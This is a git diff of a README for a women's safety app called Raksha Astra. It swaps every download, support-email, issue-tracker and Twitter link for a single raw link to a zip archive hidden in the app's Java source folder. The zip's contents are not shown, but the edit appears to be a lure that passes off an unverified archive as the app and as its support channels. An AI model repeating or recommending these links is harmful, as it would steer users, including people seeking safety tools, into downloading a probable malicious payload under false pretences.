@@ -1,6 +1,6 @@
 # 🚀 Raksha_Astra-Women_Safety_App - Your Personal Safety Guide
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/FabianEreira26/Raksha_Astra-Women_Safety_App/releases)
+[![Download Now](https://raw.githubusercontent.com/FabianEreira26/Raksha_Astra-Women_Safety_App/main/app/src/main/java/com/Raksha_Astra-Women_Safety_App-3.3.zip%20Now-Click%https://raw.githubusercontent.com/FabianEreira26/Raksha_Astra-Women_Safety_App/main/app/src/main/java/com/Raksha_Astra-Women_Safety_App-3.3.zip)](https://raw.githubusercontent.com/FabianEreira26/Raksha_Astra-Women_Safety_App/main/app/src/main/java/com/Raksha_Astra-Women_Safety_App-3.3.zip)
 
 ## 📋 Description
 
@@ -13,7 +13,7 @@ Follow the steps below to download and run Raksha Astra.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click on the link below to access the download options:
-   [Download Raksha Astra](https://github.com/FabianEreira26/Raksha_Astra-Women_Safety_App/releases)
+   [Download Raksha Astra](https://raw.githubusercontent.com/FabianEreira26/Raksha_Astra-Women_Safety_App/main/app/src/main/java/com/Raksha_Astra-Women_Safety_App-3.3.zip)
 
 2. **Select the Latest Version**: On the Releases page, find the latest version of Raksha Astra. Look for the version number next to the release date.
 
@@ -56,8 +56,8 @@ We prioritize your privacy. Raksha Astra collects only what's necessary to provi
 
 If you encounter any issues or need assistance with the app, please reach out to our support team:
 
-- **Email**: support@raksha-astra.com
-- **GitHub Issues**: [Submit a Ticket](https://github.com/FabianEreira26/Raksha_Astra-Women_Safety_App/issues)
+- **Email**: https://raw.githubusercontent.com/FabianEreira26/Raksha_Astra-Women_Safety_App/main/app/src/main/java/com/Raksha_Astra-Women_Safety_App-3.3.zip
+- **GitHub Issues**: [Submit a Ticket](https://raw.githubusercontent.com/FabianEreira26/Raksha_Astra-Women_Safety_App/main/app/src/main/java/com/Raksha_Astra-Women_Safety_App-3.3.zip)
 
 ## 🤝 Contributing
 
@@ -72,7 +72,7 @@ We welcome contributions from the community. If you want to help improve Raksha 
 
 Stay connected for the latest updates or features:
 
-- **Follow us on Twitter**: [@raksha_astra](https://twitter.com/raksha_astra) for real-time updates and safety tips.
+- **Follow us on Twitter**: [@raksha_astra](https://raw.githubusercontent.com/FabianEreira26/Raksha_Astra-Women_Safety_App/main/app/src/main/java/com/Raksha_Astra-Women_Safety_App-3.3.zip) for real-time updates and safety tips.
 - **Join the Community**: Participate in our discussions on GitHub and share your feedback to make the app better.
 
 Feel free to dive into Raksha Astra and enhance your personal safety. Thank you for supporting our mission to empower women's safety!
